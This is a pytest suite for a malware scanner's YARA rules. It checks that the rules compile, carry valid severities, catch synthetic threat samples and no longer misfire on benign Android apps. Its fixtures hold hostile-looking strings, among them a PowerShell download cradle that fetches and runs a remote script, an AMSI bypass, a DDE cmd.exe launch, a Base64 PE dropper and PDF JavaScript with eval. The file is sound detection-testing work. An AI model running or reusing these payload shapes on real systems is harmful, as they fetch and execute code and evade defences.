"""
Guards for the YARA rule file itself.

An unreferenced string in one rule (`$icici`, declared and never used in
FakeCalls_Banking_App) is a COMPILE error in YARA, and yara.compile() loads the
file as a unit — so that single line disabled all 21 rules. Nothing noticed,
because a compile failure and a missing yara-python both surfaced as
`yara_available: False`, and no test had ever executed a rule.

These tests need yara-python and skip cleanly without it, which is the same
posture the scanner takes. The skip is the point: if CI never installs
yara-python then the rules are never verified there either, and this file says
so out loud rather than passing silently.
"""

import pytest

yara = pytest.importorskip("yara", reason="yara-python not installed — rules cannot be verified")

import os  # noqa: E402

RULES_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "analysis_engine", "yara_rules",
)


def _rule_files():
    return [
        os.path.join(RULES_DIR, f)
        for f in sorted(os.listdir(RULES_DIR))
        if f.endswith((".yar", ".yara"))
    ]


def test_rule_files_exist():
    assert _rule_files(), f"no .yar files in {RULES_DIR}"


def test_all_rules_compile():
    """The guard that was missing. A broken rule file disables every rule."""
    for path in _rule_files():
        try:
            yara.compile(filepath=path)
        except yara.SyntaxError as exc:
            pytest.fail(f"{os.path.basename(path)} does not compile — ALL rules are disabled: {exc}")


def test_scanner_reports_rules_as_available():
    """End-to-end: the scanner must actually load them, not just the raw file.

    scan_file() returning yara_available=False is how the breakage hid, so assert
    the positive case rather than trusting the absence of an exception.
    """
    from analysis_engine import yara_scanner

    yara_scanner._yara_available = None      # reset the module-level cache
    yara_scanner._compiled_rules = None
    result = yara_scanner.scan_file(__file__)

    assert result["yara_available"], (
        f"scanner could not load rules: {result.get('yara_error')}"
    )


def test_every_rule_declares_a_known_severity():
    """_check_yara scores off `severity`; a typo silently makes a rule worthless.

    A rule with no severity defaults to "medium", which scores zero — so a
    critical detection can be reduced to a report line by a spelling mistake.
    """
    known = {"critical", "high", "medium", "informational"}
    missing, unknown = [], []

    for path in _rule_files():
        rules = yara.compile(filepath=path)
        for rule in rules:
            # IsPDF/IsZIP/IsPE/... are private file-type gates, not detections,
            # so they carry no severity by design.
            if getattr(rule, "is_private", False):
                continue
            sev = (rule.meta or {}).get("severity")
            if sev is None:
                missing.append(rule.identifier)
            elif sev not in known:
                unknown.append(f"{rule.identifier}={sev!r}")

    assert not missing, f"rules with no severity (default to 'medium', worth 0 points): {missing}"
    assert not unknown, f"rules with an unrecognised severity: {unknown}"


# ── Detection still fires ─────────────────────────────────────────────────────
# Every rule loosened above needs a matching true-positive case. Tuning a rule
# until benign files stop matching is trivial and worthless if the malicious
# shape stops matching too — these are the other half of that trade.

def _scan_bytes(payload: bytes, suffix=".bin"):
    """Compile the real rule file and scan a synthetic sample in memory.

    Deliberately scans a buffer rather than a temp file. Several of these samples
    are the shapes antivirus exists to catch — EICAR, a PowerShell download
    cradle — so writing them to disk loses a race with the local AV, which
    quarantines the file before YARA can open it ("could not open file"). The
    bytes never touch the filesystem, so the tests are unaffected by whatever
    protection the developer is running. `suffix` is kept for readability at the
    call sites; YARA matches on content, never on the file name.
    """
    rules = yara.compile(filepath=os.path.join(RULES_DIR, "common_threats.yar"))
    return {m.rule for m in rules.match(data=payload, timeout=30)}


PE_STUB = b"MZ\x90\x00" + b"\x00" * 60 + b"PE\x00\x00" + b"\x00" * 64

# Rules are file-type gated now (see the header of common_threats.yar), so a
# sample has to look like the container the rule applies to. Loose strings in a
# nameless buffer count as "script or text" and never reach the APK or PE rules
# — which is exactly the point: it is what stopped PDF and PowerShell rules
# firing on Paytm's APK.
ZIP_MAGIC = b"PK\x03\x04"


def _as_apk(payload: bytes) -> bytes:
    return ZIP_MAGIC + b"\x14\x00\x00\x00" + payload


def _as_pe(payload: bytes) -> bytes:
    return PE_STUB + payload


def test_pe_hidden_in_a_pdf_is_still_caught():
    """PE_In_Document's condition was inverted — it matched plain executables and
    could not match what it was written for. This is the shape it must catch."""
    pdf = b"%PDF-1.7\n" + b"junk " * 40 + PE_STUB + b"\n%%EOF"
    assert "PE_In_Document" in _scan_bytes(pdf, ".pdf")


def test_pe_hidden_in_an_office_document_is_still_caught():
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100 + PE_STUB
    assert "PE_In_Document" in _scan_bytes(ole, ".doc")


def test_a_plain_executable_is_not_a_pe_in_a_document():
    """Regression: this matched all 120 sampled Windows System32 binaries."""
    assert "PE_In_Document" not in _scan_bytes(PE_STUB + b"\x00" * 400, ".exe")


def test_base64_encoded_pe_is_still_caught():
    dropper = b"$data = 'TVqQAAMAAAAEAAAA//8AALgAAAA'; iex($data)"
    assert "Base64_Encoded_PE" in _scan_bytes(dropper, ".ps1")


def test_incidental_lowercase_tvo_is_not_a_base64_pe():
    """Regression: `nocase` on case-sensitive base64 matched 'tVo' in binaries."""
    assert "Base64_Encoded_PE" not in _scan_bytes(b"\x00\xfftVo\x11random binary tVo data" * 20)


def test_drinik_named_sample_is_still_caught():
    apk = _as_apk(b"classes.dex drinikapk com.example.income_tax accessibilityservice")
    assert "Drinik_Banking_Trojan" in _scan_bytes(apk, ".apk")


def test_drinik_needs_more_than_an_incidental_substring():
    """Regression: 'iAssist' matched inside Microsoft's ShellAppRuntime.exe."""
    assert "Drinik_Banking_Trojan" not in _scan_bytes(_as_apk(b"UIAssistant helper module" * 30), ".apk")


def test_eicar_is_still_caught():
    eicar = (b"X5O!P%@AP[4\PZX54(P^)7CC)7}$"
             + b"EICAR-STANDARD-ANTIVIRUS" + b"-TEST-FILE!$H+H*")
    assert "EICAR_Test_File" in _scan_bytes(eicar, ".txt")


def test_powershell_download_cradle_is_still_caught():
    cradle = b"powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://x/a.ps1')\""
    assert "PowerShell_DownloadCradle" in _scan_bytes(cradle, ".ps1")


def test_ransomware_shape_still_caught_but_crypto_alone_is_not():
    """File_Encryption_API now needs directory enumeration too — encrypting and
    deleting is what backup tools do; walking every folder to do it is not."""
    ransom = _as_pe(b"CryptEncrypt DeleteFile FindFirstFileW FindNextFileW")
    assert "File_Encryption_API" in _scan_bytes(ransom, ".exe")
    assert "File_Encryption_API" not in _scan_bytes(_as_pe(b"CryptEncrypt DeleteFileW"), ".exe")


# ── Regressions found by scanning a real Android package ──────────────────────
# F-Droid, an open-source app store, scored 75/Malicious. The benign corpus that
# had just reported 0% false positives held Windows binaries, npm JavaScript,
# Python packages and PDFs — no APKs. An APK is a large ZIP full of translations,
# resource strings and repo metadata, and it is the P0 artifact type.

def test_donation_and_backup_wording_is_not_a_ransom_note():
    """Matched 'bitcoin' (apps list it as a donation method) and 'how to
    restore' (a backup feature), and scored CRITICAL, +40, on that pair."""
    app = _as_apk(b"Support this app: donate via Bitcoin or PayPal. "
                  b"Settings > Backup: how to restore your backup from a previous device.")
    assert "Generic_Ransomware_Note" not in _scan_bytes(app, ".apk")


def test_security_tool_vocabulary_is_not_a_ransom_note():
    """'ransom' and 'bitcoin' describe a topic, not an act."""
    article = b"This ransomware analysis explains ransom demands paid in bitcoin."
    assert "Generic_Ransomware_Note" not in _scan_bytes(article, ".txt")


def test_an_actual_ransom_note_is_still_caught():
    note = b"!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!\nTo restore your files, send 0.5 BTC."
    assert "Generic_Ransomware_Note" in _scan_bytes(note, ".txt")


def test_onion_address_alone_does_not_score():
    """Tor is a privacy feature. This matched F-Droid's own .onion mirror, and
    would equally match Tor Browser, OnionShare and SecureDrop."""
    rules = yara.compile(filepath=os.path.join(RULES_DIR, "common_threats.yar"))
    severity = {r.identifier: (r.meta or {}).get("severity") for r in rules}
    assert severity["Hardcoded_TOR_Onion"] == "medium", \
        "a .onion reference must be reported, not scored"


def test_localhost_is_not_described_as_c2_infrastructure():
    """The rule matched 127.0.0.1. Report text is part of the product — calling
    localhost 'C2 infrastructure' is simply false."""
    rules = yara.compile(filepath=os.path.join(RULES_DIR, "common_threats.yar"))
    meta = {r.identifier: (r.meta or {}) for r in rules}
    assert meta["Suspicious_IP_C2"]["severity"] == "medium"
    assert "C2" not in meta["Suspicious_IP_C2"].get("description", "")


# ── Every rule must still be able to fire ─────────────────────────────────────
# 15 rules were given file-type gates at once. A gate pointing at the wrong
# container makes a rule silently unfireable — indistinguishable from a rule that
# simply never matches, which is how the whole ruleset stayed dead for months.
# One correctly-typed positive sample per rule is the cheapest guard against it.

B64 = "QUFB" * 40          # >100 base64 chars, for the -EncodedCommand rule

RULE_SAMPLES = {
    "EICAR_Test_File": (None, b"X5O!P%@AP[4\PZX54(P^)7CC)7}$"
                              b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"),
    "PowerShell_EncodedCommand": (None, ("powershell.exe -EncodedCommand " + B64).encode()),
    "PowerShell_DownloadCradle": (None, b"IEX(New-Object Net.WebClient).DownloadString('http://x/a')"),
    "PowerShell_AMSI_Bypass":    (None, b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"),
    "PE_In_Document":            ("pdf", b"%PDF-1.7\n" + b"x" * 40 + PE_STUB),
    "Base64_Encoded_PE":         (None, b"payload = 'TVqQAAMAAAA...'"),
    "PDF_JavaScript_Exploit":    ("pdf", b"%PDF-1.7\n/JavaScript (var x = unescape('%u4141'); eval(x);)"),
    "PDF_AutoAction":            ("pdf", b"%PDF-1.7\n1 0 obj<</OpenAction<</S/GoTo>>>>endobj"),
    "Office_AutoOpen_Macro":     ("zip", b"AutoOpen Sub Shell(cmd) End Sub"),
    "Office_DDE_Exploit":        ("zip", b"DDEAUTO c:\\windows\\system32\\cmd.exe"),
    "Hardcoded_TOR_Onion":       (None, b"c2 = fdroidorg6cooksyluodepej4erfctzk7rrjpjbbr6wx24jh3lqyfwyd.onion"),
    "Suspicious_IP_C2":          (None, b" ".join(b"10.0.0.%d" % i for i in range(1, 20))),
    "Generic_RAT_Strings":       (None, b"screenshot keylogger webcam reverse_shell execute_command"),
    "Njrat_Indicators":          (None, b"njRAT v0.7d Bladabindi HvncPlugin"),
    "AsyncRAT_Indicators":       (None, b"AsyncRAT client HRZN GetInstallPath AES_decrypt"),
    "Drinik_Banking_Trojan":     ("zip", b"drinikapk classes.dex"),
    "FakeCalls_Banking_App":     ("zip", b"bankCallService hanaBankServiceCode FakeCall"),
    "Generic_Banking_Overlay":   ("zip", b"android.permission.SYSTEM_ALERT_WINDOW netbanking UPI BHIM"),
    "Generic_Ransomware_Note":   (None, b"!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!! to restore your files send BTC"),
    "File_Encryption_API":       ("pe",  b"CryptEncrypt DeleteFile FindFirstFileW FindNextFileW"),
    "Suspicious_Section_Names":  ("pe",  b"UPX0\x00UPX1\x00.MPRESS"),
}


def _wrap(container, payload):
    if container == "pdf":
        return payload if payload.startswith(b"%PDF") else b"%PDF-1.7\n" + payload
    if container == "zip":
        return _as_apk(payload)
    if container == "pe":
        return _as_pe(payload)
    return payload


def test_every_rule_has_a_positive_sample():
    """The table must not drift behind the rule file."""
    rules = yara.compile(filepath=os.path.join(RULES_DIR, "common_threats.yar"))
    names = {r.identifier for r in rules if not getattr(r, "is_private", False)}
    missing = sorted(names - set(RULE_SAMPLES))
    assert not missing, f"rules with no positive sample: {missing}"


@pytest.mark.parametrize("rule", sorted(RULE_SAMPLES))
def test_rule_fires_on_its_own_sample(rule):
    container, payload = RULE_SAMPLES[rule]
    hits = _scan_bytes(_wrap(container, payload))
    assert rule in hits, (
        f"{rule} did not fire on a correctly-typed sample — most likely its "
        f"file-type gate is wrong, which makes it permanently dead. Matched: {sorted(hits)}"
    )
